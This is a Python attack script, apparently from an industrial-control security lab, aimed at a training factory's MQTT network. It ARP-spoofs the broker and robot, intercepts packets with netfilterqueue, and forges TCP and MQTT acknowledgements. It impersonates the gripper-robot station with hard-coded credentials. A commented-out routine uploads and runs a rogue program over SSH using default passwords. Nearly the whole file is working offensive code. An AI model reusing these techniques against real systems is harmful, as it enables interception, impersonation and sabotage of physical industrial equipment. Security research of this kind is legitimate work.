import time, subprocess
import json
import logging
from datetime import timezone, datetime
from scapy.contrib import mqtt
from scapy import all as scapy

import paho.mqtt.client as paho_mqtt

import threading

from paramiko import SSHClient
from paramiko.client import AutoAddPolicy
from scp import SCPClient
import netfilterqueue


id_, type_, start_inbound_attack = None, None, None


print("nice")
print(id_, type_, start_inbound_attack)
print("nice")


# def packet_process(packet):
#     global id_, type_, start_inbound_attack
#     if packet[scapy.TCP].payload:
#         load = packet["Raw"].load
#
#         if b"fl/hbw/ack" in load:
#             print(load)
#             nfc_payload = load.decode("utf_8", errors="ignore")[16:]
#             nfc_payload = json.loads(nfc_payload)
#             print(nfc_payload)
#
#             id_ = nfc_payload["workpiece"]["id"]
#             type_ = nfc_payload["workpiece"]["type"]
#             print(id_, type_)
#             logger.info("Captured ordered WP. Color is %s and ID is %s" % (type_, id_))
#
#         if b"f/i/state/dsi" in load:
#             dsi_payload = load.decode("utf_8", errors="ignore")[16:]
#             dsi_payload = json.load(dsi_payload)
#             print(dsi_payload)
#
#             if dsi_payload["active"] == "0" and dsi_payload["code"] == "0":
#                 start_inbound_attack = True

# def sniffer():
#     scapy.sniff(iface="wlan0", filter="src port 1883", prn=packet_process)

def extract_packet_attributes(packet, has_mqtt=True):
    """Function to extract real time dynamic info/attr from IP, TCP, MQTT layers
     Info such as ip src & dst, TCP src & dst, TCP seq & ack, MQTT msg ID
     """
    src_ip = packet[scapy.IP].src
    dst_ip = packet[scapy.IP].dst
    src_port = int(packet[scapy.TCP].sport)
    dst_port = int(packet[scapy.TCP].dport)
    tcp_seq = int(packet[scapy.TCP].seq)
    tcp_ack = int(packet[scapy.TCP].ack)
    tcp_payload_len = len(packet[scapy.TCP].payload)  # the tcp paylod len is equivalent to len of entire MQTT packet
    mqtt_msgid = None
    if has_mqtt == True:
        try:
            mqtt_msgid = int(packet[mqtt.MQTTPublish].msgid)
        except IndexError:
            mqtt_msgid = int(packet[mqtt.MQTTSubscribe].msgid)

    return [src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid]


def packet_process(packet):
    global id_, type_, start_inbound_attack

    packet = scapy.IP(packet.get_payload())
    # packet.show()

    if packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet[scapy.TCP].flags == "S":
        # what to do to sync packets
        print("TCP S packet received")
        packet_attr = extract_packet_attributes(packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, _ = packet_attr
        tcp3way_ack_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+1, flags="SA")
        scapy.send(tcp3way_ack_resp)
        print("TCP Ack sent for 3way")

    elif packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet.haslayer(mqtt.MQTTConnect):
        packet_attr = extract_packet_attributes(packet, False)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, _ = packet_attr
        # Send a forged PUBACK to sender
        forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                        ack=tcp_seq + tcp_payload_len,
                                                                        flags="PA") / mqtt.MQTT(
            type=2) / mqtt.MQTTConnack()
        scapy.send(forged_mqtt_resp)
        print("Forged packet sent for ConnAck")

    elif packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet.haslayer(
            mqtt.MQTTSubscribe):
        packet_attr = extract_packet_attributes(packet, True)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr

        if mqtt_msgid == 2:
            if mqtt_msgid == 1:
                forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port,
                                                                                seq=tcp_ack,
                                                                                ack=tcp_seq + tcp_payload_len,
                                                                                flags="PA") / mqtt.MQTT(
                    type=9, QOS=1) / mqtt.MQTTSuback(msgid=1)
                scapy.send(forged_mqtt_resp)

        else:
            raw_mqtt_load = "90 03 00 02 01 90 03 00 03 01 90 03 00 04 01 90 03 00 05 01 90 03 00 06 01 90 03 00 07 01 40 02 00 08"
            raw_mqtt_load = bytes.fromhex(raw_mqtt_load)
            forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack,
                                                                            ack=tcp_seq + tcp_payload_len,
                                                                            flags="PA") / scapy.Raw(load=raw_mqtt_load)
            scapy.send(forged_mqtt_resp)
            # print("Forged packet sent for SubAck")

    elif packet[scapy.IP].dst == "192.168.0.10" and packet[scapy.IP].dport == 1883 and packet.haslayer(mqtt.MQTTPublish):

        packet_attr = extract_packet_attributes(packet, True)
        src_ip, dst_ip, src_port, dst_port, tcp_seq, tcp_ack, tcp_payload_len, mqtt_msgid = packet_attr
        # Send a forged PUBACK to sender
        forged_mqtt_resp = scapy.IP(src=dst_ip, dst=src_ip) / scapy.TCP(sport=dst_port, dport=src_port, seq=tcp_ack, ack=tcp_seq+tcp_payload_len, flags="PA") / mqtt.MQTT(
            type=4, QOS=1) / mqtt.MQTTPuback(msgid=mqtt_msgid)

        # print("Forged packet sent for PubAck")

        # check if the packet has PUBLISH packets of interest
        topic = packet[mqtt.MQTTPublish].topic
        value = packet[mqtt.MQTTPublish].value

        if topic == b"f/i/state/dsi":
            dsi_payload = value.decode("utf-8", "ignore")
            dsi_payload = json.loads(dsi_payload)
            if dsi_payload["active"] == 0 and dsi_payload["code"] == 0:
                print(dsi_payload)
                start_inbound_attack = True

        if topic == b"f/i/nfc/ds":
            nfc_payload = value.decode("utf-8", "ignore")
            nfc_payload = json.loads(nfc_payload)
            # print(nfc_payload)

            id_ = nfc_payload["workpiece"]["id"]
            if nfc_payload["workpiece"]["type"] != "NONE":
                type_ = nfc_payload["workpiece"]["type"]
            print("Captured ordered WP. Color is %s and ID is %s" % (type_, id_))


        # condition
        if topic == b"fl/vgr/do":
            print("nice")
            exit

        scapy.send(forged_mqtt_resp)


    else:
        print("No conditions matched")


def broker():
    ss = netfilterqueue.NetfilterQueue()
    ss.bind(22, packet_process)
    ss.run()

def second_attack():
    logger.info("Starting file upload attack on 192.168.0.13")
    # server = '192.168.0.13'
    # port = '22'
    # username = password = 'ROBOPro'
    #
    # # create ssh object and connect
    # ssh = SSHClient()
    # ssh.load_host_keys('/home/kali/.ssh/known_hosts')
    # ssh.set_missing_host_key_policy(AutoAddPolicy)
    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    #
    # # hijack the established tcp/ssh connection and copy files
    # scp = SCPClient(ssh.get_transport())
    # path = '/home/kali/fischer/vgr/C-Program/'
    # # now copy the rogue program
    # scp.put(f'{path}TxtParkPosVGR', '.')
    #
    # # now run the rogue program
    # ssh.exec_command('./TxtParkPosVGR')
    # time.sleep(7)
    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
    # ssh.exec_command('./TxtParkPosVGR')
    # logger.info("Finished file upload attack on 192.168.0.13")


thread_file_upload = threading.Thread(target=second_attack)
# thread_sniffer = threading.Thread(target=sniffer)
thread_sniffer = threading.Thread(target=broker)

logger = logging.getLogger("attack_inbound")
logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

order_color = None

# First we definee variables
src_ip = "192.168.0.105"
dst_ip = "192.168.0.10"
dst_port = 1883


def state(active, code, description="", station="vgr", target=None):
    if target is None:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
               '"station" : "%s",\n\t' % (active, code, description, station)
        data += new_ts()
    else:
        data = '{\n\t"active" : %s,\n\t"code" : %s,\n\t"description" : "%s",\n\t' \
           '"station" : "%s",\n\t"target" : "%s",\n\t' % (active, code, description, station, target)
        data += new_ts()
    return data


def new_ts():
    # function to generate new timestamps
    ts = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'
    ts_ = f'"ts" : "{ts}"\n' + '}'
    return ts_


# what happens if a ConnAct packet is received? Then we subscribe
def on_connect(client, *lis):
    # IF a ConnAck is received, then we subscribe to our packets of interest as VGR
    [client.subscribe(x) for x in
     ("f/o/state/ack", "f/o/order", "f/o/nfc/ds", "fl/ssc/joy", "fl/mpo/ack", "fl/hbw/ack", "fl/sld/ack")]
    logger.info("Subscription to all topics of interest done")
    time.sleep(0.1)

    # Now we publish our first packet
    data = '{\n\t"hardwareId" : "50F14AE8CF8D",\n\t"message" : "init",\n\t"softwareName" : "TxtFactoryVGR",\n\t' + \
           '"softwareVersion" : "0.8.1",\n\t"station" : "VGR",\n\t' + new_ts()
    client.publish("fl/broadcast", data, qos=1)
    client.user_data_set(8)

# What happens if a SubAck is received?
def on_subscribe(client, *lis):
    pass


# What happens when a publish message is sent from us and a puback has been received
def on_publish(client, userdata, msgid, *rest):
    global start_inbound_attack
    msgid_sim = client.user_data_get()

    if start_inbound_attack is True:
        client.user_data_set(33)

    match msgid_sim:
        case 8:
            time.sleep(0.4)
            # Publish for f/i/state/hbw
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "hbw",\n\t' + new_ts()
            client.publish("f/i/state/hbw", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 9:
            # Publish for f/i/state/mpo
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "mpo",\n\t' + new_ts()
            client.publish("f/i/state/mpo", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 10:
            # Publish for f/i/state/sld
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "sld",\n\t' + new_ts()
            client.publish("f/i/state/sld", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 11:
            time.sleep(0.7)
            # Publish for f/i/state/vgr
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "hbw"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 12:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "mpo"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 13:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dso"\n\t' + new_ts()
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 14:
            data = '{\n\t"active" : "0",\n\t"code" : "0",\n\t"description" : "",\n\t' + \
                   '"station" : "vgr",\n\t"target" : "dsi"\n\t' + new_ts()
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 15:
            data = state("0", "0", description="", station="dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 16:
            data = '{\n\t"state" : "WAITING_FOR_ORDER",\n\t' + new_ts()[:-2] + ',\n\t"type" : "NONE"\n }'
            client.publish("f/i/order", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 17:
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "",\n\t\t' \
                   '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}'
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        # Case bundle for situation where same information (active=0,code=1) is sent in f/i/state/vgr
        case 18 | 23 | 26 | 27 | 28:
            (active, code) = (1, 2) if msgid_sim in [18, 26] else (0, 1)
            data = state(active, code, "", "vgr", "")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 19 | 21 | 24 | 29 | 31 | 65 | 77 | 82 | 84:
            if msgid_sim == 21:
                time.sleep(0.7)
            data = state(0, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 20 | 22 | 25 | 30 | 32 | 66 | 78 | 83 | 85:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 33:
            while start_inbound_attack != True:
                print("No")
                continue
            print("Inbound attack started", print(start_inbound_attack))
            # time.sleep(4)
            data = state(0, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)
            start_inbound_attack = False

        case 34 | 36 | 38 | 45:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)


        case 35:
            data = state(0, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 37:

            data = state(1, 0, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)



        # case block to handle bulk cases where active, code, target is 0,1,hbw respectively
        case 39 | 43 | 48 | 50 | 52 | 53 | 54 | 56 | 58 | 60 | 61 | 69 | 71 | 72 | 73 | 80 | 81 | 86:
            if msgid_sim == 50:
                time.sleep(1.7)
            if msgid_sim == 54:
                time.sleep(1.4)
            if msgid_sim == 58:
                time.sleep(1.3)
            if msgid_sim == 61:
                time.sleep(2.3)
            if msgid_sim == 69:
                time.sleep(2)
            if msgid_sim == 71:
                time.sleep(1)
            if msgid_sim == 72:
                time.sleep(7)
            if msgid_sim == 73:
                time.sleep(10)
            if msgid_sim == 86:
                logger.info("Waiting for attack to finish, just a moment")
                thread_file_upload.join()
                thread_sniffer.join()
                
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

    # case block to handle bulk cases where active, code, target is 1,2,hbw respectively
        case 40 | 42 | 47 | 49 | 51 | 55 | 57 | 59 | 67 | 68 | 70 | 79:
            if msgid_sim == 49:
                time.sleep(0.5)
            if msgid_sim == 68:
                time.sleep(6)
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 41:
            time.sleep(0.4)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 44:
            data = state(1, 1, "", "dsi")
            client.publish("f/i/state/dsi", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 45:
            data = state(0, 1, "", "dso")
            client.publish("f/i/state/dso", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 46:
            time.sleep(1.5)
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 62:
            while id_ is None:
                continue
            print("id received, for msgid 62", id_)
            data = '{\n\t"history" : null,\n\t' + new_ts()[:-2] + ',\n\t"workpiece" : \n\t{\n\t\t"id" : "%s",\n\t\t' \
                                                                  '"state" : "RAW",\n\t\t"type" : "NONE"\n\t}\n}' % id_
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 63:
            while type_ is None:
                continue
            print("id received, for msgid 63", id_, type_)
            data = '{\n\t"history" : \n\t[\n\t\t{\n\t\t\t"code" : 100,\n\t\t\t' + new_ts()[:-2] + '\n\t\t},\n\t\t{\n\t\t\t' \
                    '"code" : 200,\n\t\t\t' + new_ts()[:-2] + '\n\t\t}\n\t],\n\t' + new_ts()[:-2] + \
                    ',\n\t"workpiece" : \n\t{\n\t\t"id" : "%s",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % (id_, type_)
            client.publish("f/i/nfc/ds", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 64:
            while type_ is None:
                continue
            print("id received, for msgid 64", id_, type_)
            data = '{\n\t"code" : 1,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "%s",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % (id_, type_)
            client.publish("fl/vgr/do", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

            thread_file_upload.start()

        case 74:
            #This is where the VGR (after the container has been fetched by the HBW) does the action of dropping the WP on the container
            client.user_data_set(-1)

        case 75:
            # The VGR immediately before dropping the WP, informs that it has gone active again and then takes 8 seconds
            # to rotate back to its home position
            data = state(1, 2, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

        case 76:
            # The VGR after 8 seconds is now back to its default/home location
            # and immediately sends out its state that it has become inactive
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)
        # After ack 86, I don't seem to care anymore

        case -1:
            pass

        #case to send f/i/state/vgr information every 10 seconds when there is no process to fufill in FL
        case _:
            time.sleep(10)
            data = state(0, 1, "", "vgr", "hbw")
            client.publish("f/i/state/vgr", data, qos=1)
            client.user_data_set(client.user_data_get() + 1)

def on_message(client, userdata, mqttmsg):
    global order_color, start_inbound_attack
    mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json


    # if mqttmsg.topic == "fl/ssc/joy" and start_inbound_attack == True:
    #     print("Inbound attack started")
    #     #time.sleep(4)
    #     data = state(0, 0, "", "dsi")
    #     client.publish("f/i/state/dsi", data, qos=1)
    #     client.user_data_set(34)
    #     start_inbound_attack = False

    if mqttmsg.topic == "fl/hbw/ack" and mqttpayload["code"] == 1:
        while id_ is None and type_ is None:
            continue
        print("id received, for msgid hbw/ack", id_, type_)
        data = '{\n\t"code" : 2,\n\t' + new_ts()[:-2] + \
                   ',\n\t"workpiece" : \n\t{\n\t\t"id" : "%s",\n\t\t"state" : "RAW",\n\t\t"type" : "%s"\n\t}\n}' % (id_, type_)
        client.publish("fl/vgr/do", data, qos=1)
        client.user_data_set(75)


############## one way like this won't work because the broker disconnects me. This happens because the broker
# program is on. THe broker program is on because I am not ARPIng it [the broker] like in the attack_order program.
ss = subprocess.getoutput('python3 arpspoofer.py -s 192.168.0.10 -t 192.168.0.13')
##############

# but now I am going to try ARPIng the broker
# ss = subprocess.getoutput('python3 arpspoofer.py -t 192.168.0.10 -s 192.168.0.13')
print(ss)
logging.info("Successfully spoofed VGR with just 1 arp packet")

thread_sniffer.start()  # start the sniffer at program start
logger.info("Sniffer started. Listening for WP id and color")

mqtt_connect = paho_mqtt.Client(paho_mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8', clean_session=True, protocol=paho_mqtt.MQTTv31, userdata=0)
mqtt_connect.username_pw_set('txt', 'xtx')
mqtt_connect.connect(host=dst_ip, port=dst_port, keepalive=120)

mqtt_connect.on_connect = on_connect
mqtt_connect.on_subscribe = on_subscribe
mqtt_connect.on_publish = on_publish
mqtt_connect.on_message = on_message


mqtt_connect.loop_forever()




